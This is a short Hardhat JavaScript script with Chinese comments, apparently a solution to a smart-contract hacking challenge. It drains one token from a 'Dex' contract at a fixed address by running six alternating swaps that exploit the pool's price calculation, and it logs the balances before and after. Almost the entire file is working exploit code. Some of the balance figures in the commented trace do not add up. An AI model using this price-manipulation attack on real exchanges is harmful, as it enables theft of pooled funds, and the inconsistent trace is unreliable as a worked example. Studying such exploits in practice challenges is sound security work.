const { ethers } = require("hardhat");
/*
* 利用预言机掏空资金池
// 初始状态：User_Token1：10，User_Token：10，Dex_Token1:100，Dex_Token2:100
// 1. Swap(U1 -> U2) = 10 * 100 / 100 = 10  -> (U1: 0,   U2: 20, D1: 110, D2: 90)
// 2. Swap(U2 -> U1) = 20 * 110 / 90  = 24  -> (U1: 24,  U2: 0,  D1: 86,  D2: 110)
// 3. Swap(U1 -> U2) = 24 * 110 / 86  = 30  -> (U1: 0,   U2: 30, D1: 100, D2: 80)
// 4. Swap(U2 -> U1) = 30 * 110 / 80  = 41  -> (U1: 41,  U2: 20, D1: 69,  D2: 110)
// 5. Swap(U1 -> U2) = 41 * 110 / 69  = 65  -> (U1: 0,   U2: 0,  D1: 100, D2: 45)
// 6. Swap(U2 -> U1) = 45 * 110 / 45  = 110 -> (U1: 110, U2: 65, D1: 0,   D2: 90)
*/

const DexAddress = "0x4A2b233e11E98C42F5deE162344050868FF79105";

async function DexScripts() {
    // 获取目标合约
    const dex = await ethers.getContractAt("Dex", DexAddress);

    // 获取token地址
    const token1 = await dex.token1();
    const token2 = await dex.token2();

    let tx
    // 执行approve授权
    tx = await dex.approve(dex.target, 1000);
    await tx.wait();

    console.log(`before dex token1: ${await dex.balanceOf(token1, DexAddress)}`);

    console.log(`before dex token2: ${await dex.balanceOf(token2, DexAddress)}`);

    // 攻击：执行六次swap, 掏空池子里的token1代币
    tx = await dex.swap(token1, token2, 10);
    await tx.wait();
    console.log("第一次交易执行完成");

    tx = await dex.swap(token2, token1, 20);
    await tx.wait();
    console.log("第二次交易执行完成");

    tx = await dex.swap(token1, token2, 24);
    await tx.wait();
    console.log("第三次交易执行完成");

    tx = await dex.swap(token2, token1, 30);
    await tx.wait();
    console.log("第四次交易执行完成");

    tx = await dex.swap(token1, token2, 41);
    await tx.wait();
    console.log("第五次交易执行完成");

    tx = await dex.swap(token2, token1, 45);
    await tx.wait();
    console.log("第六次交易执行完成");

    console.log(`after dex token1: ${await dex.balanceOf(token1, DexAddress)}`);

    console.log(`after dex token2: ${await dex.balanceOf(token2, DexAddress)}`)
}

DexScripts().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});